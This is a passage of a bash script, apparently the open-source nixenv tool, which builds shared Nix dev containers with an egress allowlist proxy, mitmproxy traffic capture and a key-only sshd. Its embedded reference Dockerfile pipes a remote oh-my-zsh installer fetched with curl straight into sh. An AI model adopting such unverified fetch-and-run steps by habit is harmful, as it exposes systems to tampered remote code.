#!/usr/bin/env bash
# =============================================================================
# nixenv.sh — self-contained shared Nix dev environment in a Docker volume
# =============================================================================
# This single script embeds every supporting file (flake.nix, the reference
# Dockerfile, the runtime entrypoint, and the home skeleton). On each run it
# writes them into a context dir ($HOME/.nixenv/context by default) and builds
# everything from there — so the script is fully portable: copy just this file.
#
#   1. Materialise the embedded context into $CONTEXT_DIR.
#   2. Create a STANDALONE Docker volume holding the Nix store (/nix).
#   3. A BUILDER container (nixos/nix) realises every flake dep into the volume
#      and installs them into a shared profile that also lives in the volume.
#   4. A BASIC runtime container (debian:stable-slim) mounts the volume read-only
#      at /nix, creates a non-root `app` user, and starts zsh + starship.
#
# Per-project layout (named volumes; <project>/home is only the one-time seed):
#   volume <prefix>_<name>_app       → /app or <project>/app_mount (code; WORKDIR)
#   volume <prefix>_<name>_home      → /home/app (dotfiles, nvim, shell history)
#   volume <prefix>_<name>_databases → /databases (persistent DB data)
#
# Copyright (C) 2026 Thomas Rabaix and nixenv contributors
# Licensed under the GNU General Public License v3.0 or later — see LICENSE.
# This program comes with ABSOLUTELY NO WARRANTY. It is free software, and you
# are welcome to redistribute it under certain conditions.
# =============================================================================

set -euo pipefail

# Bump on release; the Homebrew formula's `test` asserts this matches its tag.
NIXENV_VERSION="0.3.1"

# ── Configuration (override via env) ─────────────────────────────────────────
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CONTEXT_DIR="${CONTEXT_DIR:-$HOME/.nixenv/context}"  # embedded files written here
FLAKE_DIR="${FLAKE_DIR:-$CONTEXT_DIR}"               # dir containing flake.nix
HOME_SKEL="${HOME_SKEL:-$CONTEXT_DIR/home-skel}"     # project home template
ENTRYPOINT_FILE="${ENTRYPOINT_FILE:-$CONTEXT_DIR/entrypoint.sh}"
DEPLOY_ENTRYPOINT_FILE="${DEPLOY_ENTRYPOINT_FILE:-$CONTEXT_DIR/deploy-entrypoint.sh}"
BUILDER_IMAGE="${BUILDER_IMAGE:-nixos/nix:2.32.8}"
# Some source builds sandbox with bubblewrap (needs user namespaces the builder
# can't create). Set to 1 to run the nix builder --privileged if you hit that.
# (zmx is installed as a prebuilt binary, so this is off by default.)
BUILDER_PRIVILEGED="${BUILDER_PRIVILEGED:-0}"
RUNTIME_IMAGE="${RUNTIME_IMAGE:-debian:stable-slim}"
FLAKE_REF="${FLAKE_REF:-.#default}"                  # what to build/install from the flake
PROFILE="${PROFILE:-/nix/var/nix/profiles/shared}"  # base profile path INSIDE /nix
PROJECT_ATTR="${PROJECT_ATTR:-default}"              # flake output attr installed from a project repo
SSHD_PORT="${SSHD_PORT:-2222}"                       # unprivileged in-container sshd port (non-root)
CONTAINER_PREFIX="${CONTAINER_PREFIX:-nixenv}"       # container name = <prefix>-<project>
# Every engine-side name follows the prefix — containers, volumes, networks AND
# the store — so two prefixes on one engine share nothing ('stop' with no
# project only sweeps its own). dev/flake.nix's wrappers use 'nixdev', so a
# nested nixenv can never touch the hosted one. With the default prefix these
# are the historical names.
NIX_VOLUME="${NIX_VOLUME:-${CONTAINER_PREFIX}__nixos_store}"  # standalone Docker volume for /nix
APP_USER="${APP_USER:-app}"                          # non-root user in the runtime container
# Projects always live in ~/.nixenv/projects. NIXENV_PROJECTS_DIR exists ONLY for
# the test suite (isolation) — it is intentionally not a documented user setting.
PROJECTS_DIR="${NIXENV_PROJECTS_DIR:-$HOME/.nixenv/projects}"
CLAUDE_DIR="${CLAUDE_DIR:-$HOME/.nixenv/claude}"     # shared Claude CLI creds/config dir (~/.claude)
CLAUDE_JSON="${CLAUDE_JSON:-$HOME/.nixenv/claude.json}" # shared Claude global config file (~/.claude.json)
CONTAINER_ENGINE="${CONTAINER_ENGINE:-}"             # docker|podman; empty = auto-detect
ENGINE_FILE="${ENGINE_FILE:-$HOME/.nixenv/engine}"   # remembered engine choice
GITHUB_TOKEN_FILE="${GITHUB_TOKEN_FILE:-$HOME/.nixenv/github_token}"  # optional, raises GitHub's API limit
GITHUB_TOKEN_SKIP="${GITHUB_TOKEN_SKIP:-$HOME/.nixenv/github_token.skip}" # "don't ask again" marker
ENGINE=""                                            # resolved at runtime

# --- Reverse proxy (nixenv proxy) --------------------------------------------
PROXY_NET="${PROXY_NET:-${CONTAINER_PREFIX}_net}"    # shared user network all projects join
PROXY_NAME="${CONTAINER_PREFIX}-proxy"               # the Caddy proxy container name
PROXY_DIR="${PROXY_DIR:-$HOME/.nixenv/proxy}"        # Caddyfile + certs + caddy data
PROXY_DOMAIN="${PROXY_DOMAIN:-nixenv.localhost}"     # base domain: <project>-<port>.<PROXY_DOMAIN>
PROXY_HTTP_PORT="${PROXY_HTTP_PORT:-80}"             # host port → caddy 8080 (use 8080 for podman rootless)
PROXY_HTTPS_PORT="${PROXY_HTTPS_PORT:-443}"          # host port → caddy 8443 (use 8443 for podman rootless)
PROXY_AUTOSTART="${PROXY_AUTOSTART:-1}"              # auto-start the proxy on 'run' (0 to disable)
EGRESS_PORT="${EGRESS_PORT:-3128}"                   # squid egress port INSIDE the egress container (not published)
EGRESS_NAME="${CONTAINER_PREFIX}-egress"             # egress container: squid (+ mitmproxy while capturing)
EGRESS_NET="${EGRESS_NET:-${PROXY_NET}-egress}"      # its own outbound network; only it + Caddy join it
EGRESS_LINK="${CONTAINER_PREFIX}__egress-link"       # its alias on EGRESS_NET ('__': no project can own it)
EGRESS_DATA_DIR="${EGRESS_DATA_DIR:-$PROXY_DIR/egress-data}"  # squid log, captures, mitmproxy CA
CAPTURE_WEB_IN_PORT=8081                             # mitmweb UI port inside the egress container (reached via Caddy: <p>-mitm.<domain>)
CAPTURE_EGRESS_BASE=8100                             # + n: project n's egress listener (loopback, squid's peer)
CAPTURE_INGRESS_BASE=8200                            # + n: project n's ingress listener (Caddy only)

# --- Templates (init --template=<name|url|path>) ------------------------------
# A template is ONE file: the project's flake.nix. Short names resolve against
# this base; full URLs and local paths are used as-is.
# The default is PINNED to what shipped with this script, never `main`:
#   1. templates/ next to the script (a git clone),
#   2. ../share/nixenv/templates (Homebrew's pkgshare, installed with the release),
#   3. else the GitHub tag matching NIXENV_VERSION.
# Set TEMPLATE_BASE=https://raw.githubusercontent.com/rande/nixenv/main/templates
# explicitly to follow main.
if [ -z "${TEMPLATE_BASE:-}" ]; then
  if [ -f "$SCRIPT_DIR/templates/wordpress.nix" ]; then
    TEMPLATE_BASE="file://$SCRIPT_DIR/templates"
  elif [ -d "$SCRIPT_DIR/../share/nixenv/templates" ]; then
    TEMPLATE_BASE="file://$(cd "$SCRIPT_DIR/../share/nixenv/templates" && pwd)"
  else
    TEMPLATE_BASE="https://raw.githubusercontent.com/rande/nixenv/v$NIXENV_VERSION/templates"
  fi
fi
TEMPLATE_CACHE="$HOME/.nixenv/templates"             # fetched templates are cached here

# ── Pretty output ────────────────────────────────────────────────────────────
c_blue='\033[1;34m'; c_green='\033[1;32m'; c_yellow='\033[1;33m'; c_red='\033[1;31m'; c_reset='\033[0m'
log()  { printf "${c_blue}==>${c_reset} %s\n" "$*"; }
ok()   { printf "${c_green}✓${c_reset} %s\n" "$*"; }
warn() { printf "${c_yellow}!${c_reset} %s\n" "$*"; }
die()  { printf "${c_red}✗ %s${c_reset}\n" "$*" >&2; exit 1; }

# =============================================================================
# materialize_context — write all embedded files into $CONTEXT_DIR
# =============================================================================
# Called at the start of every real command. flake.lock is NOT touched, so it
# persists across runs. Heredocs are single-quoted: content is written verbatim.
materialize_context() {
  local c="$CONTEXT_DIR"
  mkdir -p "$c/home-skel/.config/nvim" "$c/home-skel/.ssh"

  cat > "$c/flake.nix" <<'NIXENV_FLAKE'
{
  description = "Shared NixOS dev environment (store lives in a Docker volume)";

  # Stable channel for the whole toolchain; unstable ONLY for fast-moving tools
  # like the Claude CLI. Run `nixenv.sh update` to roll the locked revs forward.
  inputs.nixpkgs.url = "github:NixOS/nixpkgs/nixos-26.05";
  inputs.nixpkgs-unstable.url = "github:NixOS/nixpkgs/nixos-unstable";

  outputs = { self, nixpkgs, nixpkgs-unstable }:
    let
      systems = [ "x86_64-linux" "aarch64-linux" ];
      forAllSystems = nixpkgs.lib.genAttrs systems;
    in
    {
      # `packages.<system>.default` is a single buildEnv that aggregates every
      # tool into one /bin. The orchestration script installs it into a profile
      # inside the Docker volume, so the runtime container only needs one PATH
      # entry: <profile>/bin.
      packages = forAllSystems (system:
        let
          pkgs = import nixpkgs {
            inherit system;
            config.allowUnfree = true;
          };
          unstable = import nixpkgs-unstable {
            inherit system;
            config.allowUnfree = true;
          };
          # zmx: session persistence (github:neurosnap/zmx). Installed as a
          # PREBUILT static-musl binary — building from source uses zig2nix +
          # bubblewrap, which needs user namespaces the builder container can't
          # create. PINNED by sha256: the build stays pure, and a
          # changed upstream artifact fails the build instead of landing in
          # every container. To upgrade, bump zmxVersion AND both hashes — take
          # them from the release's .sha256 files (zmx.sh/a/<asset>.sha256), which
          # must equal GitHub's asset digests. See RELEASING.md.
          zmxVersion = "0.8.1";
          zmxHashes = {
            x86_64-linux  = "dfd75720b942466f28870731cc86dbc07afa72fb8f3bd5eeb4ff707e4eecebe8";
            aarch64-linux = "943eb44c812333fd450da12097521afd3339436e86f8c2ac618b905c4c9ece68";
          };
          zmxArch = if system == "aarch64-linux" then "aarch64" else "x86_64";
          zmxAsset = "zmx-${zmxVersion}-linux-${zmxArch}.tar.gz";
          zmxSrc = pkgs.fetchurl {
            urls = [
              "https://github.com/neurosnap/zmx/releases/download/v${zmxVersion}/${zmxAsset}"
              "https://zmx.sh/a/${zmxAsset}"
            ];
            sha256 = zmxHashes.${system};
          };
          zmxPkg = pkgs.runCommand "zmx-${zmxVersion}" { } ''
            mkdir src
            tar -xzf ${zmxSrc} -C src
            bin=$(find src -type f -name zmx | head -n1)
            [ -n "$bin" ] || { echo "zmx binary not found in ${zmxAsset}" >&2; exit 1; }
            install -Dm755 "$bin" $out/bin/zmx
          '';
        in
        {
          default = pkgs.buildEnv {
            name = "nixos-dev-env";
            # Pull in man pages, but NOT "doc": some packages (e.g. python3.12)
            # fail to build their doc output, which would break the whole env.
            extraOutputsToInstall = [ "man" ];
            paths = with pkgs; [
              # ── Core dev tools ─────────────────────────────────────────────
              (lib.hiPrio git) # full git wins over propagated git-minimal
              vim
              htop
              btop
              zsh
              oh-my-zsh
              zsh-autosuggestions
              zsh-syntax-highlighting
              tig
              delta
              lazygit
              curl
              wget
              iputils      # ping
              dnsutils     # host, dig, nslookup
              caddy        # ingress reverse proxy for the shared 'nixenv proxy' container
              squid        # egress allowlist proxy (restricted projects), runs in the egress container
              mitmproxy    # 'nixenv capture': records restricted projects' traffic, behind squid.
                           # A Python app, but nixpkgs wraps it — no python on PATH.
              socat        # ssh-over-CONNECT ProxyCommand + tcp relays for restricted projects
              age          # 'nixenv deploy': encrypt secrets to a public key (no runtime needed)
              sops         # 'nixenv deploy': encrypted secrets files (Go binary, no runtime)
              rsync
              jq
              yq-go
              ripgrep
              fd
              fzf
              bat
              zoxide
              tree
              zmxPkg       # zmx — terminal session persistence (github:neurosnap/zmx)
              direnv
              starship
              tldr
              ncdu
              unzip
              gnused
              gnugrep
              gawk
              coreutils
              findutils
              less
              openssh
              runit
              cacert

              # ── Languages & runtimes: NONE, on purpose ────────────────────
              # The base is a shell + editor + CLI toolbox shared by every
              # project. Language runtimes (Node, PHP, Python, Go, Rust, Ruby…),
              # their package managers and their language servers belong in a
              # PER-PROJECT flake (`nixenv build <project>`), so each project
              # pins its own versions and nothing pays for what it doesn't use.
              # See templates/ for complete examples.

              # ── Build tools (compile native deps: node-gyp, wheels, etc.) ──
              gnumake
              gcc
              binutils
              pkg-config
              cmake
              autoconf
              automake
              libtool

              # ── Editor: Neovim (AstroNvim) ────────────────────────────────
              # Only servers that need no language runtime on PATH: lua (for the
              # nvim config itself) and bash. Everything else — pyright, gopls,
              # intelephense, rust-analyzer, ruby-lsp, typescript-language-server
              # — goes in the PROJECT's flake next to the runtime it serves.
              neovim
              tree-sitter          # parser generator AstroNvim uses
              lua-language-server  # for editing the nvim config itself
              bash-language-server # shell scripts (bash is always present)

              # ── AI tooling (from nixpkgs-unstable only) ────────────────────
              unstable.claude-code

              # ── Misc handy tools ───────────────────────────────────────────
              httpie
              entr
              watchexec
              dust
              procs
              procps
              sd
              tokei
              hyperfine
              glow
              difftastic
            ];
          };
        });

      # Optional: `nix develop` works too if you have Nix on the host.
      devShells = forAllSystems (system:
        let pkgs = import nixpkgs { inherit system; config.allowUnfree = true; };
        in {
          default = pkgs.mkShell {
            packages = [ self.packages.${system}.default ];
          };
        });
    };
}
NIXENV_FLAKE

  cat > "$c/Dockerfile" <<'NIXENV_DOCKERFILE'
# =============================================================================
# NixOS Development Container  (REFERENCE — not used by nixenv.sh)
# =============================================================================
# Kept for reference: the original monolithic image that baked every tool in.
# nixenv.sh instead shares a single Nix store via a Docker volume.
# =============================================================================

FROM nixos/nix:2.32.8

ARG NIXPKGS_CHANNEL=nixos-26.05
ARG NODE_MAJOR=22
ARG PHP_PKG=85
ARG RUST_CHANNEL=stable
ARG PYTHON_PKG=312
ARG OH_MY_ZSH_THEME=robbyrussell

ENV NIX_PATH="nixpkgs=channel:${NIXPKGS_CHANNEL}" \
    LANG=en_US.UTF-8 \
    TERM=xterm-256color \
    SHELL=/root/.nix-profile/bin/zsh \
    EDITOR=vim

RUN set -eux \
    && nix-channel --add "https://nixos.org/channels/${NIXPKGS_CHANNEL}" nixpkgs \
    && nix-channel --update \
    && nix-env -iA \
        nixpkgs.vim nixpkgs.htop nixpkgs.btop nixpkgs.zsh \
        nixpkgs.zsh-autosuggestions nixpkgs.zsh-syntax-highlighting \
        nixpkgs.tig nixpkgs.delta nixpkgs.lazygit nixpkgs.curl nixpkgs.wget \
        nixpkgs.rsync nixpkgs.jq nixpkgs.yq-go nixpkgs.ripgrep nixpkgs.fd \
        nixpkgs.fzf nixpkgs.bat nixpkgs.zoxide nixpkgs.tree \
        nixpkgs.direnv nixpkgs.starship nixpkgs.tldr nixpkgs.ncdu \
        nixpkgs.unzip nixpkgs.gnused nixpkgs.gnugrep nixpkgs.gawk \
        nixpkgs.coreutils nixpkgs.findutils nixpkgs.less nixpkgs.openssh nixpkgs.cacert \
        nixpkgs.nodejs_${NODE_MAJOR} nixpkgs.go_latest nixpkgs.rustup \
        nixpkgs.php${PHP_PKG} nixpkgs.php${PHP_PKG}Packages.composer \
        nixpkgs.python${PYTHON_PKG} nixpkgs.uv nixpkgs.sqlite \
        nixpkgs.httpie nixpkgs.entr nixpkgs.watchexec nixpkgs.dust nixpkgs.procs \
        nixpkgs.procps nixpkgs.sd nixpkgs.tokei nixpkgs.hyperfine nixpkgs.glow \
        nixpkgs.difftastic \
    && printf '%s\n' 'with import <nixpkgs> {}; lib.hiPrio git' > /tmp/git-hiprio.nix \
    && nix-env -if /tmp/git-hiprio.nix \
    && rustup default ${RUST_CHANNEL} \
    && rustup component add rust-src rust-analyzer clippy rustfmt \
    && sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)" "" --unattended \
    && nix-collect-garbage -d \
    && nix-store --optimise \
    && rm -rf /tmp/*

WORKDIR /workspace
VOLUME ["/workspace"]
ENTRYPOINT ["/root/.nix-profile/bin/zsh"]
NIXENV_DOCKERFILE

  cat > "$c/entrypoint.sh" <<'NIXENV_ENTRYPOINT'
#!/bin/sh
# =============================================================================
# Runtime container entrypoint — runs ENTIRELY as a non-root user
# =============================================================================
# The container is started with `--user <uid>:<gid>` (your host id). The login
# user ("app") is resolved from a bind-mounted /etc/passwd; HOME (/home/app) and
# /app are writable bind-mounts/volumes owned by that uid. Nothing here needs
# root: sshd runs unprivileged on a high port (2222) with no privilege
# separation, writing its keys/config/runit-service into the writable HOME.
# =============================================================================
set -eu

APP_USER="${APP_USER:-app}"
PROFILE="${PROFILE:-/nix/var/nix/profiles/shared}"
ZSH_BIN="$PROFILE/bin/zsh"
HOME_DIR="${HOME:-/home/$APP_USER}"
SSHD_PORT="${SSHD_PORT:-2222}"
APP_MOUNT="${NIXENV_APP_MOUNT:-/app}"   # where the code volume is mounted

mkdir -p "$HOME_DIR/.cache/omz" "$HOME_DIR/.ssh" 2>/dev/null || true
chmod 700 "$HOME_DIR/.ssh" 2>/dev/null || true

# --- CA bundle ---------------------------------------------------------------
# The shared store ships a CA bundle. When nixenv mounts the reverse proxy's root
# CA (mkcert's or Caddy's internal), merge the two into a writable bundle so
# https://*.<proxy domain> is TRUSTED inside the container — curl, PHP, Node,
# Python, git all read one of the vars exported below. Falls back to the store
# bundle untouched when no proxy CA is mounted.
# /etc/nixenv-capture-ca.crt is mitmproxy's CA, mounted once 'nixenv capture'
# has been on for this project: it is what lets the egress container read this
# project's HTTPS. 'capture untrust' + restart = no longer trusted.
_NIXENV_CA_BUNDLE="$PROFILE/etc/ssl/certs/ca-bundle.crt"
_NIXENV_NODE_CA=""
_extra_cas=""
for _ca in /etc/nixenv-proxy-ca.crt /etc/nixenv-capture-ca.crt; do
  [ -f "$_ca" ] && _extra_cas="$_extra_cas $_ca"
done
if [ -n "$_extra_cas" ]; then
  # shellcheck disable=SC2086
  if cat "$PROFILE/etc/ssl/certs/ca-bundle.crt" $_extra_cas > "$HOME_DIR/.nixenv-ca-bundle.crt" 2>/dev/null \
     && cat $_extra_cas > "$HOME_DIR/.nixenv-extra-ca.crt" 2>/dev/null; then
    _NIXENV_CA_BUNDLE="$HOME_DIR/.nixenv-ca-bundle.crt"
    # Node ignores SSL_CERT_FILE; it needs NODE_EXTRA_CA_CERTS (the extra certs
    # only, not the bundle) — ONE file, hence the second concatenation.
    _NIXENV_NODE_CA="export NODE_EXTRA_CA_CERTS=\"$HOME_DIR/.nixenv-extra-ca.crt\""
  fi
fi
export SSL_CERT_FILE="$_NIXENV_CA_BUNDLE" NIX_SSL_CERT_FILE="$_NIXENV_CA_BUNDLE"
export CURL_CA_BUNDLE="$_NIXENV_CA_BUNDLE" REQUESTS_CA_BUNDLE="$_NIXENV_CA_BUNDLE"
export GIT_SSL_CAINFO="$_NIXENV_CA_BUNDLE"
[ -n "$_NIXENV_NODE_CA" ] && export NODE_EXTRA_CA_CERTS="$HOME_DIR/.nixenv-extra-ca.crt"

# --- Shared profile + shell config available to every zsh --------------------
# .zshenv is sourced for login and non-login shells alike. $PROFILE etc. are
# baked in at write time; \$HOME / \$NIXENV_* stay literal for zsh to evaluate.
cat > "$HOME_DIR/.zshenv" <<EOF
export PROFILE="$PROFILE"
export NIXENV_PROJECT="${NIXENV_PROJECT:-}"
export NIXENV_APP_MOUNT="$APP_MOUNT"
# Claude CLI: name this project's transcript dir after the project instead of
# an encoded cwd. Matches the ~/.claude/projects mount cmd_run sets up, and is
# repeated here because sshd builds a FRESH environment for login shells —
# the container's -e never reaches an ssh/zmx session.
export CLAUDE_CODE_PROJECT_DIR_NAME="nixenv-${NIXENV_PROJECT:-unknown}"
export NIXENV_EXTRA_PROFILE="${NIXENV_EXTRA_PROFILE:-}"
# PATH order: the user's own ~/.local/bin wins over everything (pip --user,
# pipx, hand-dropped binaries — it lives in the home volume, so it persists),
# then the per-project profile (extra tooling), then base.
_nixenv_extra=""
[ -n "\$NIXENV_EXTRA_PROFILE" ] && [ -d "\$NIXENV_EXTRA_PROFILE/bin" ] && _nixenv_extra="\$NIXENV_EXTRA_PROFILE/bin:"
export PATH="\$HOME/.local/bin:\${_nixenv_extra}$PROFILE/bin:\$HOME/.cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
export ZSH="$PROFILE/share/oh-my-zsh"
export ZSH_CACHE_DIR="\$HOME/.cache/omz"
export SSL_CERT_FILE="$_NIXENV_CA_BUNDLE"
export NIX_SSL_CERT_FILE="$_NIXENV_CA_BUNDLE"
export CURL_CA_BUNDLE="$_NIXENV_CA_BUNDLE"
export REQUESTS_CA_BUNDLE="$_NIXENV_CA_BUNDLE"
export GIT_SSL_CAINFO="$_NIXENV_CA_BUNDLE"
$_NIXENV_NODE_CA
export EDITOR=vim
export LANG=C.UTF-8
EOF

# --- Egress restriction (set only for restricted projects) ------------------
# NIXENV_EGRESS_PROXY=http://<proxy-container>:<port>. The container has no
# route to the internet (internal network); this proxy is the only way out.
# 1. Export the proxy env vars every HTTP-family tool honours.
# 2. Route ssh through the proxy's CONNECT tunnel (socat), so git-over-ssh and
#    plain ssh to VALIDATED hosts work; everything else is denied by the proxy.
if [ -n "${NIXENV_EGRESS_PROXY:-}" ]; then
  # Internal traffic must NOT go through the proxy: sibling containers on the
  # shared/internal networks, this project itself, and any name in /etc/hosts.
  # (Squid denies RFC1918 by design, so proxying these would break them.)
  # Private ranges cover container networks; hostnames cover DNS-by-name.
  _noproxy="localhost,127.0.0.1,::1,10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,.localhost,.local,.internal"
  # Every declared /etc/hosts.extra name is internal by definition.
  for _hf in "${NIXENV_EXTRA_PROFILE:-}/etc/hosts.extra" /etc/hosts.extra; do
    [ -f "$_hf" ] || continue
    while read -r _ip _nm _rest; do
      case "$_ip" in \#*|"") continue;; esac
      [ -n "$_nm" ] && _noproxy="$_noproxy,$_nm"
    done < "$_hf"
  done
  # The project's own container name/hostname.
  # (container names are <prefix>-<name>; the prefix is passed in by 'run')
  _cpfx="${NIXENV_CONTAINER_PREFIX:-nixenv}"
  [ -n "${NIXENV_PROJECT:-}" ] && _noproxy="$_noproxy,$NIXENV_PROJECT,$_cpfx-$NIXENV_PROJECT"

  # Export in THIS process too, so runit project services (php-fpm, workers, …)
  # inherit the proxy env — they never source .zshenv.
  export HTTP_PROXY="$NIXENV_EGRESS_PROXY"  HTTPS_PROXY="$NIXENV_EGRESS_PROXY"
  export http_proxy="$NIXENV_EGRESS_PROXY"  https_proxy="$NIXENV_EGRESS_PROXY"
  export NO_PROXY="$_noproxy" no_proxy="$_noproxy"
  cat >> "$HOME_DIR/.zshenv" <<EOF
export HTTP_PROXY="$NIXENV_EGRESS_PROXY"
export HTTPS_PROXY="$NIXENV_EGRESS_PROXY"
export http_proxy="$NIXENV_EGRESS_PROXY"
export https_proxy="$NIXENV_EGRESS_PROXY"
export NO_PROXY="$_noproxy"
export no_proxy="$_noproxy"
EOF
  _ep="${NIXENV_EGRESS_PROXY#http://}"; _ep="${_ep%/}"
  _ephost="${_ep%%:*}"; _epport="${_ep##*:}"
  # The blocks below are written ONCE (marker-guarded) into the home volume, so
  # they keep the egress address they were written with. When it changes
  # (squid moved from <prefix>-proxy to <prefix>-egress), rewrite the old
  # address in place — otherwise yarn/npm/ssh would keep using a proxy that no
  # longer exists. The previous address: our record, else the old .npmrc block.
  _prev="$(cat "$HOME_DIR/.nixenv-egress-proxy" 2>/dev/null || true)"
  [ -n "$_prev" ] || _prev="$(sed -n '/^# nixenv-egress/,/^noproxy=/s/^https-proxy=//p' "$HOME_DIR/.npmrc" 2>/dev/null | head -n 1)"
  if [ -n "$_prev" ] && [ "$_prev" != "$NIXENV_EGRESS_PROXY" ]; then
    _pp="${_prev#http://}"; _pp="${_pp%/}"; _phost="${_pp%%:*}"; _pport="${_pp##*:}"
    for _f in "$HOME_DIR/.npmrc" "$HOME_DIR/.yarnrc" "$HOME_DIR/.ssh/config"; do
      [ -f "$_f" ] || continue
      # cat > (not mv): keep the file's inode, mode and owner.
      sed -e "s#$_prev#$NIXENV_EGRESS_PROXY#g" \
          -e "s#PROXY:$_phost:%h:%p,proxyport=$_pport#PROXY:$_ephost:%h:%p,proxyport=$_epport#" \
          -e "/^Host \\* /s# !$_phost # !$_ephost #" \
          "$_f" > "$_f.nixenv-tmp" && cat "$_f.nixenv-tmp" > "$_f"
      rm -f "$_f.nixenv-tmp"
    done
    echo "nixenv: egress proxy moved: $_prev → $NIXENV_EGRESS_PROXY (updated .npmrc/.yarnrc/.ssh/config)"
  fi
  printf '%s\n' "$NIXENV_EGRESS_PROXY" > "$HOME_DIR/.nixenv-egress-proxy"
  mkdir -p "$HOME_DIR/.ssh"; touch "$HOME_DIR/.ssh/config"
  if ! grep -q '^# nixenv-egress' "$HOME_DIR/.ssh/config" 2>/dev/null; then
    cat >> "$HOME_DIR/.ssh/config" <<EOF

# nixenv-egress (auto-added on restricted projects; delete this block to opt out)
# Internal names (sibling containers, *.local/*.internal) connect DIRECTLY;
# everything else tunnels out through the egress proxy's CONNECT.
Host * !localhost !127.0.0.1 !$_ephost !*.local !*.internal !*.localhost !$_cpfx-*
    ProxyCommand $PROFILE/bin/socat - PROXY:$_ephost:%h:%p,proxyport=$_epport
EOF
    chmod 600 "$HOME_DIR/.ssh/config" 2>/dev/null || true
  fi
  # yarn 1.x ignores proxy ENV VARS entirely — it only reads .yarnrc/.npmrc.
  # Write both (marker-guarded) so yarn/npm work under restriction.
  if ! grep -q 'nixenv-egress' "$HOME_DIR/.yarnrc" 2>/dev/null; then
    cat >> "$HOME_DIR/.yarnrc" <<EOF
# nixenv-egress
proxy "$NIXENV_EGRESS_PROXY"
https-proxy "$NIXENV_EGRESS_PROXY"
# yarn's self-update check bypasses proxy config entirely (hangs + retries on
# an internal network) — and store-managed yarn can never self-update anyway.
disable-self-update-check true
EOF
  fi
  if ! grep -q 'nixenv-egress' "$HOME_DIR/.npmrc" 2>/dev/null; then
    cat >> "$HOME_DIR/.npmrc" <<EOF
# nixenv-egress
proxy=$NIXENV_EGRESS_PROXY
https-proxy=$NIXENV_EGRESS_PROXY
noproxy=$_noproxy
EOF
  fi
fi

# --- Custom /etc/hosts ------------------------------------------------------
# If /etc/hosts is writable (nixenv bind-mounted one we own), rebuild it from
# base entries + two optional extra sources, in order:
#   1. the project flake's declared entries, shipped in its profile as
#      $NIXENV_EXTRA_PROFILE/etc/hosts.extra (see the flake template);
#   2. the host-side /etc/hosts.extra (local-only override, via the 'host' helper).
# When /etc/hosts is the engine-managed root-owned default this is skipped (we
# can't and needn't touch it). Regenerating (not appending) is idempotent.
if [ -w /etc/hosts ]; then
  # To reach a project's PUBLIC URL from inside, point the name at 127.0.0.1 —
  # the loopback relay above forwards to the proxy, which routes on the Host
  # header. (curl/libcurl force *.localhost to loopback anyway, ignoring this
  # file, so loopback is the one form that works for every client.)
  {
    printf '127.0.0.1\tlocalhost\n'
    printf '::1\tlocalhost ip6-localhost ip6-loopback\n'
    printf '127.0.1.1\t%s\n' "$(hostname 2>/dev/null || echo "${NIXENV_PROJECT:-localhost}")"
    [ -n "${NIXENV_EXTRA_PROFILE:-}" ] && [ -f "$NIXENV_EXTRA_PROFILE/etc/hosts.extra" ] && cat "$NIXENV_EXTRA_PROFILE/etc/hosts.extra"
    [ -f /etc/hosts.extra ] && cat /etc/hosts.extra
  } > /etc/hosts 2>/dev/null || true
fi

# =============================================================================
# Command mode: run the given command as the (already non-root) user, then exit.
# =============================================================================
if [ "$#" -gt 0 ]; then
  export PATH="$HOME/.local/bin:$PROFILE/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
  exec "$ZSH_BIN" -lc 'exec "$@"' zsh "$@"
fi

# =============================================================================
# Service mode: unprivileged sshd under runit. All paths live under the writable
# HOME so nothing needs root. sshd runs as this user; only this user can log in,
# so no setuid/privsep is required.
# =============================================================================
SSHD="$PROFILE/bin/sshd";             [ -x "$SSHD" ]      || SSHD="$(command -v sshd || true)"
SSHKEYGEN="$PROFILE/bin/ssh-keygen";  [ -x "$SSHKEYGEN" ] || SSHKEYGEN="$(command -v ssh-keygen || true)"
RUNSV="$PROFILE/bin/runsv";           [ -x "$RUNSV" ]     || RUNSV="$(command -v runsv || true)"
[ -n "$SSHD" ]  || { echo "nixenv: sshd not found in profile"; exit 1; }
[ -n "$RUNSV" ] || { echo "nixenv: runsv (runit) not found in profile"; exit 1; }

SVROOT="$HOME_DIR/.nixenv-sv"      # runit service tree (sshd + project services)
SSHRUN="$HOME_DIR/.nixenv-sshd"    # sshd config + keys
mkdir -p "$SVROOT/sshd" "$SSHRUN"

# Host key. nixenv generates it on the HOST and mounts it read-only,
# so the host can pin its fingerprint before the first connection. sshd refuses
# a private key others can read, and a bind mount keeps the host's mode/owner,
# so use a private copy. Containers started without the mount (older nixenv)
# fall back to keys generated in the writable HOME.
if [ -r /etc/nixenv/ssh_host_ed25519_key ]; then
  cp /etc/nixenv/ssh_host_ed25519_key "$SSHRUN/ssh_host_ed25519_key"
  chmod 600 "$SSHRUN/ssh_host_ed25519_key"
  HOSTKEYS="$SSHRUN/ssh_host_ed25519_key"
else
  for t in ed25519 rsa; do
    f="$HOME_DIR/.ssh/ssh_host_${t}_key"
    [ -f "$f" ] || "$SSHKEYGEN" -t "$t" -f "$f" -N "" -q
  done
  HOSTKEYS="$HOME_DIR/.ssh/ssh_host_ed25519_key $HOME_DIR/.ssh/ssh_host_rsa_key"
fi

# No authorized_keys is built from the home volume: the container must never be
# able to authorise a key itself. sshd reads ONLY the host-generated file that
# cmd_run bind-mounts read-only at /etc/nixenv/authorized_keys.

SFTP="$(ls "$PROFILE"/libexec/sftp-server 2>/dev/null || ls "$PROFILE"/libexec/openssh/sftp-server 2>/dev/null || true)"

{
  echo "Port $SSHD_PORT"
  for k in $HOSTKEYS; do echo "HostKey $k"; done
  echo "PidFile $SSHRUN/sshd.pid"
  echo "PermitRootLogin no"
  # KEY-ONLY login. This sshd listens on every interface in the
  # container, so it is reachable from other projects on nixenv_net and — for
  # restricted projects — through the proxy's relays. The only key it accepts is
  # the per-project one nixenv generated on the HOST, mounted read-only: another
  # project has no copy of it, and nothing inside this container can add one.
  echo "PubkeyAuthentication yes"
  echo "AuthenticationMethods publickey"
  echo "PasswordAuthentication no"
  echo "PermitEmptyPasswords no"
  echo "KbdInteractiveAuthentication no"
